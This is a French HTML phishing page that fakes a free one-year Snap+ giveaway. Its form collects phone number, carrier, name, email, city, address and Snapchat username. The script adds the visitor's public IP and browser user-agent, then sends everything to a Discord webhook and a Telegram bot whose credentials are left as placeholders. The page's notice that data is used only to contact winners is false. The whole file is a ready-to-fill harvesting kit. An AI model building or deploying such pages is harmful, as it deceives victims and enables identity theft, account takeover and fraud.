<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>üéÅ Snap+ 1 An Gratuit</title>
  <style>
    body {

      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;

    }

    .container {

    }

    @keyframes pulseBorder {
      0% { box-shadow: 0 0 10px #a54ffb; }

    }

    .logo {
      font-size: 70px;
      margin-bottom: 5px;
      text-shadow: 0 0 10px #fff;
    }

    h1 {
      font-size: 24px;
      margin: 0 0 15px;
      letter-spacing: 1px;
    }

    p {
      font-size: 15px;
      color: #ddd;
      margin-bottom: 25px;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 2px solid #a54ffb;
      border-radius: 10px;
      background-color: transparent;
      color: white;
      font-size: 15px;
      outline: none;
    }

    input::placeholder {
      color: #ccc;
    }

    button {
      width: 100%;
      background: #a54ffb;
      border: none;
      border-radius: 10px;
      color: white;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 12px;
      box-shadow: 0 0 10px #a54ffb;
      transition: 0.3s;
    }

    button:hover {
      background: #8b3ddb;
      box-shadow: 0 0 20px #c177ff;
    }

    .notice {
      font-size: 12px;
      margin-top: 15px;
      color: #bbb;
    }

    #step2 {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">üëª‚ú®</div>
    <h1>Snap+ Gratuit</h1>
    <p>Active 1 an de Snap+ gratuitement</p>

    <form id="giveawayForm">
      <div id="step1">
        <input
          type="text"
          name="telephone"
          placeholder="Num√©ro de t√©l√©phone"
          required
          pattern="[\d\s+]{6,}"
          title="Entrez un num√©ro valide"
        />
        <button type="button" onclick="showStep2()">Continuer</button>
      </div>

      <div id="step2">
        <select name="operateur" required>
          <option value="">S√©lectionnez votre op√©rateur</option>
          <option value="Orange">Orange</option>
          <option value="SFR">SFR</option>
          <option value="Bouygues">Bouygues</option>
          <option value="Free">Free</option>
          <option value="NRJ Mobile">NRJ Mobile</option>
          <option value="La Poste Mobile">La Poste Mobile</option>
          <option value="Auchan T√©l√©com">Auchan T√©l√©com</option>
          <option value="Autre">Autre</option>
        </select>

        <input type="text" name="nom" placeholder="Nom" required />
        <input type="text" name="prenom" placeholder="Pr√©nom" required />
        <input type="email" name="email" placeholder="Email" required />
        <input type="text" name="ville" placeholder="Ville" required />
        <input type="text" name="departement" placeholder="D√©partement" required />
        <input type="text" name="adresse" placeholder="Adresse (facultatif)" />
        <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
        <button type="submit">Valider</button>
      </div>
    </form>

    <div class="notice">
      Les donn√©es sont utilis√©es uniquement pour vous contacter si vous gagnez. Ce concours
      n‚Äôest pas affili√© √† Snapchat.
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/TON_WEBHOOK_ICI";
    const TELEGRAM_TOKEN = "TON_TELEGRAM_BOT_TOKEN_ICI";
    const TELEGRAM_CHAT_ID = "TON_TELEGRAM_CHAT_ID";

    const SUBMISSION_LIMIT = 2;
    const TIME_WINDOW_MINUTES = 30;

    function showStep2() {
      const phoneInput = document.querySelector('[name="telephone"]');
      if (!phoneInput.value.trim()) {
        alert("Veuillez entrer votre num√©ro de t√©l√©phone.");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    }

    async function getPublicIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip || "IP inconnue";
      } catch {
        return "IP inconnue";
      }
    }

    function canSubmit() {
      const now = Date.now();
      const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
      const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
      if (recent.length >= SUBMISSION_LIMIT) return false;
      recent.push(now);
      localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
      return true;
    }

    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
        disable_web_page_preview: true
      };

      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        if (!res.ok) throw new Error("Erreur lors de l'envoi Telegram");
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }

    document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      if (!canSubmit()) {
        alert(`Vous avez d√©pass√© la limite de ${SUBMISSION_LIMIT} participations toutes les ${TIME_WINDOW_MINUTES} minutes.`);
        return;
      }

      const data = new FormData(this);
      const ip = await getPublicIP();
      const userAgent = navigator.userAgent || "User-Agent inconnu";

      const message = `
üéÅ *Nouvelle participation Snap+* 
  ‚îå‚îÄüìû Contact
   ‚îÇ ‚îú‚îÄ T√©l√©phone : ${data.get("telephone") || "N/A"}
   ‚îÇ ‚îú‚îÄ Op√©rateur : ${data.get("operateur") || "N/A"}
   ‚îÇ ‚îú‚îÄ Email     : ${data.get("email") || "N/A"}
   ‚îÇ ‚îî‚îÄ Snapchat  : ${data.get("snap") || "N/A"}

  ‚îú‚îÄüë§ Identit√©
   ‚îÇ ‚îú‚îÄ Nom      : ${data.get("nom") || "N/A"}
   ‚îÇ ‚îú‚îÄ Pr√©nom   : ${data.get("prenom") || "N/A"}

  ‚îú‚îÄüìç Localisation
   ‚îÇ ‚îú‚îÄ Ville        : ${data.get("ville") || "N/A"}
   ‚îÇ ‚îú‚îÄ D√©partement  : ${data.get("departement") || "N/A"}
   ‚îÇ ‚îî‚îÄ Adresse      : ${data.get("adresse") || "Non fournie"}

  ‚îî‚îÄüåê Infos techniques
   ‚îÇ ‚îú‚îÄ IP          : ${ip}
   ‚îÇ ‚îî‚îÄ User-Agent  : ${userAgent}

üïí Re√ßu le : ${new Date().toLocaleString("fr-FR")}
`;

      // Envoi Discord
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message }),
      })
      .then(() => sendToTelegram(message))
      .then(() => {
        window.location.href = "merci.html";
      })
      .catch((err) => {
        alert("Erreur lors de l‚Äôenvoi. R√©essayez.");
        console.error(err);
      });
    });
  </script>
</body>
</html>
